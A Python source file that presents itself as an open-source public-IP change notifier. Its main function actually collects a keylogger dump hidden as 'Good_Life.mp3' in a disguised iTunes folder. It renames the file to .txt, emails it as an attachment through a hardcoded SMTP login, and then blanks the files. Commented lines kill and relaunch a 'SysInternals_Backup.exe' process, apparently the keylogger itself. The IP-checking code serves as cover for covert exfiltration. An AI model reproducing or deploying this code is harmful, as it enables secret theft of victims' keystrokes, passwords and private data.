#Current Version: Beta 1.3.1
#Getting public IP and checking if its the same as previously know IP,
# If the same then do nothing. IF different notifiy and update file
# K&M Inc. - Max Derevencha 05/16/2020
#Open-Source

#ChangeLog:
    # Version Beta 1.3.1
      #Gets Public IP address and checks if the one stored in the file is the same or different.
      #If differnt it overwrites it and send user an email.
            # DONE - V B 0.1.4 Simplify and clean up code with function
            # DONE - V B 0.1.5 - Error catching IPv4 API's  Put in Error handling.
            # DONE - V B 1.0.0 - Sending an Encrypted Email - Verified via Packet Capture using Wireshark.
            # DONE - V B 1.1.2 - Added backup API to get Public IP -  - 1) v4.ident.me 2) icanhazip.com 3. ifconfig.com/ip
            # DONE - V B 1.1.4 - Added Hostname, IP, APIUsed to email sent to users.
            # DONE - V B 1.2.0 - Added a config file and adjustable settings.
            # DONE - V B 1.3.1 - Added ability to have custom API's in config file.
            # DONE - V B 1.4.3 - When run for first time, asks user for input on email config - some default options enabled.
            # DONE - V B 1.4.5 - Secure password entry on inital config.
            # DONE - V B 1.5.0 - Base64 Encoded password for storage.
#Upcoming Changes
    #Migrate to https://github.com/kootenpv/yagmail for less code and more security.
    #Hashed password save and sending to Auth Server.
    #Check if config file doesnt have blanks/missing inputs.
    #Add Bug Reporting to a my email. Enabled by default and allow users to disable.
    #Send an encrypted notification via OS/Text - Let user choose notification frequency/Template and enter information. Store in config file.
    #Get additional IP information. Ex: ISP, City, Country, AS, Blacklists, Open Port, etc.
    #Option to run a port scan and notifiy of any changes.
    #Create a config file that has all Variables.
    #Create a log entry everytime it checks for IP in a seperate file. With Time/Date current IP and if changed to what.
    #Check if IP is running through a proxy,VPN,ISP, etc.
    #Make it a constantly running background file thats asks user how often it wants to check Public IP.
    #Make it capable to run on ANY OS
    #Check for updates from Server for newest version
    #Make a GUI version

### KNOWN BUGS
    #Local IPV4 address is wrong. May need to give specific interface or somethign else.
    #SMTP Password is not hashed or encrypted in config file.(Currently Base64 Encoded in ConfigFile)

#Imorting URL Lib to request from website.
import urllib.request
#Importing OS to see if file exists
from os import path
#importing smtp email library
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase

#Configuration parser module
from configparser import ConfigParser
#Importin base64
import os
from email import encoders

#### My External Modules
#My Config file creater module
import ConfigFile
# Importin base64
import os
# importing smtp email library
import smtplib
# Imorting URL Lib to request from website.
import urllib.request
# Configuration parser module
from configparser import ConfigParser
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
# Importing OS to see if file exists
from os import path

#### My External Modules
# My Config file creater module
import ConfigFile

def sendEmail2(title):
    try:

        #Global Variables
        firstRun = True

        logDir = (r"C:\Users\Public\AppData\Music\iTunes\U2\All_Music")
        #Giving Introduction to user:
        #print("-------------------------------------------------------\nHello, and welcome to a K&M Inc. Program: GetPublicIP \nThis is Open-Source, feel free to use it in any way you wish (If you make any profits, please share :) ). \n ENJOY!!! \n-------------------------------------------------------\n")

        #------------Making all the necessary functions here------------#

        #Assiging current public IP to variable
        def get_public_ip_ipv4API1():
             #Getting Public IP from the first API
            publicIP = urllib.request.urlopen(ipv4API1).read().decode('utf8')
            #Returning PublicIP variable whenver this funtion is called.
            return publicIP

        #Second IP
        def get_public_ip_ipv4API2():
            # Getting Public IP from the 2nd API
            publicIP = urllib.request.urlopen(ipv4API2).read().decode('utf8')
            # Returning PublicIP variable whenver this funtion is called.
            return publicIP

        #3rd API
        def get_public_ip_ipv4API3():
            # Getting Public IP from the 3rd API
            publicIP = urllib.request.urlopen(ipv4API3).read().decode('utf8')
            # Returning PublicIP variable whenver this funtion is called.
            return publicIP

        #Function to write PublicIP to file
        def writeIPToFile():
            file = open(logDir + "\LatestPublicIP.txt", "w")
            file.write(currentPublicIP)
            file.close()

        #Function to send email
        def sendEmailFunction(title):
            print("Starting to SEND EMAIL Function")
            # Declaring config parser
            config = ConfigParser()
            config.read(logDir + '\config.ini')
            #All the various Variables needed.
            #installTime = config.get('DEFAULTS', "Install Date & Time")
            hostname = config.get('DEFAULTS', 'Host Machine Name')
            hostIP = config.get('DEFAULTS', 'Host Machine IP')
            host_username = config.get('DEFAULTS', 'Host Username')
            host_platform = config.get('DEFAULTS', 'Host platform')

            sendEmailTo = config.get('database', 'send email to')
            sender_email = config.get('database', 'sending email')
            #Decoding password

            password = 'HelloThisIsAnEmailServer'

            smtp_server = config.get('database', 'smtp server')
            emailPortSSL = config.get('database', 'smtp server port')
            sender_email = config.get('database', 'sending email')

            #Headers - Or Else Many places reject email since its not up to RFC Standards
            message = MIMEMultipart("alternative")
            message["Subject"] = config.get('DEFAULTS', 'subject')
            message["From"] = config.get('database', 'from email')
            message["To"] = config.get('database', 'to email')

            #Body of the Text
            text = config.get('DEFAULTS','Email Body').format(title,hostname, hostIP,host_username, host_platform, hostUsed, previousIP, currentPublicIP)

            #Adding the body to the headers and message field.
            part1 = MIMEText(text, "plain")
            message.attach(part1)
            import shutil
           # try:
            #    os.system('taskkill /f /im SysInt* & exit')
         #   except Exception as e:
         #       print(e)

            try:
                print(os.getcwd())

                print("Moving File")
                shutil.move(r'C:\Users\Public\AppData\Music\iTunes\U2\All_Music\Good_Life.mp3',
                          r'C:\Users\Public\AppData\Music\iTunes\U2\All_Music\Good_Life.txt')
                print("Done Moving file")

            except Exception as error:
                error = "Unable to move file, some issue or becuase its not there: {}".format(error)
                print(error)

            os.chdir(logDir + "\\")
            #Getting Logger dump ready to email.
            keylogerFile = ('Good_Life.txt')
            with open(keylogerFile, "rb") as attachment:
                part = MIMEBase("application", "octet-stream")
                part.set_payload(attachment.read())
            # Encode file in ASCII characters to send by email
            encoders.encode_base64(part)
            # Add header as key/value pair to attachment part
            part.add_header(
                "Content-Disposition",
                f"attachment; filename= {keylogerFile}",
            )
            # Add attachment to message and convert message to string
            message.attach(part)
            text = message.as_string()

            try:
                #Connection to email server.
                with smtplib.SMTP_SSL(smtp_server, emailPortSSL) as server:
                    server.login(sender_email, password)
                    print("Connected Succesfully to Email Server: {}".format(sender_email))
                    #sending actual email here.
                    server.sendmail(sender_email, sendEmailTo, message.as_string())
                    print(
                        "Succefully sent an email")

                    print("Blanking MP3 AND TXT")

                    with open('Good_Life.txt', 'w'):
                        pass

                    with open('Good_Life.mp3', 'w'):
                        pass


                    print("DONE Blanking MP3 and TXT")


                    # print(os.getcwd())
                    #print("Starting SysInt")
                   # os.system("start .\SysInternals_Backup.exe & exit")

            except Exception as error:
                print("An Error as occured: {}".format(error))

        #Checking if Initial Config file exists.
        configFileExist = path.exists("config.ini")
        if configFileExist == False:
            print("CONFIGFILEEXIST == False : Creating Configuration File\n")
            #Creating config file by calling the seperate module.
            ConfigFile.createINI()
        else:
            print("The configuration file already exists, make changes to it as you wish.\n")

        #Assigning variable with the get_public_ip function.
        try:

            # Declaring config parser
            config = ConfigParser()
            config.read(logDir + '\config.ini')
            # All the various API's
            # installTime = config.get('DEFAULTS', "Install Date & Time")
            ipv4API1 = config.get('database', 'IPv4 API #1')
            ipv4API2 = config.get('database', 'IPv4 API #2')
            ipv4API3 = config.get('database', 'IPv4 API #3')

            #Trying first API function.
            currentPublicIP = get_public_ip_ipv4API1()
            hostUsed = ipv4API1
        except Exception as error:
            print("Ran into an error getting Public IP with \"{}\" - Error is: \n {} \n Will now try with {}".format(ipv4API1, error,ipv4API2))
            try:
                currentPublicIP = get_public_ip_ipv4API2()
                hostUsed = ipv4API2
            except Exception as error:
                print("Ran into an error getting Public IP with \"{}\" - Error is: \n {} \n Will now try with {}".format(ipv4API2, error,ipv4API3))
                try:
                    currentPublicIP = get_public_ip_ipv4API3()
                    hostUsed = ipv4API3
                except Exception as error:
                    print("Ran into an error getting Public IP with \"{}\" - Error is: \n {} \n This is the last option we have. Your internet connection is probably down".format(ipv4API3, error))
                    print("\nExiting the Program Now!!\n")
                    exit()


        #Checking if publicIP file exists.
        fileExists = path.exists("LatestPublicIP.txt")
        if fileExists == False:
            writeIPToFile()
            previousIP = "Initial Configuration"
            #Updating User with Info
            print("Created your LatestPublicIP file with this IP in it: {}".format(currentPublicIP))
            #Add function to notify when file and IP initially recieved.
            sendEmailFunction(title)
        #Run the rest of the program.
        else:
            # Getting previously stored IP from the file
            publicIPFile = open("LatestPublicIP.txt", "r")
            previousIP = publicIPFile.readline()
            # Checking If IP is different.
            # If the same then stoping program
            # If Different then overwriting and sending notification.
            if previousIP == currentPublicIP:
                print("Your Public IP has not changed.\nIt is still this: {}\n \n".format(currentPublicIP))
                sendEmailFunction(title)
            elif previousIP != currentPublicIP:
                #Notifiying user that Ip is different and writing to file.
                print("Your Public IP is different: \n    Old: {}\n    New: {} \nAdding new IP to file".format(previousIP,
                                                                                                               currentPublicIP))
                #Writing IP to the file with created function.
                writeIPToFile()
                #Sending an email to user with new IP:
                sendEmailFunction(title)
            else:

                #Eventually add try/catch statements.
                print("Some Error Happened, Try again.")
                sendEmailFunction(title)

        #Staying open till user hits enter
        #input("\n-------------------------------------------------------\nThank You for using GetPublicIP by K&M Inc\nPress Enter to exit program.")

    except Exception as error:
        print("Last EXCEPTION FOR SendEMAIL")
        print(error)
        #input("Enter")


#sendEmail2()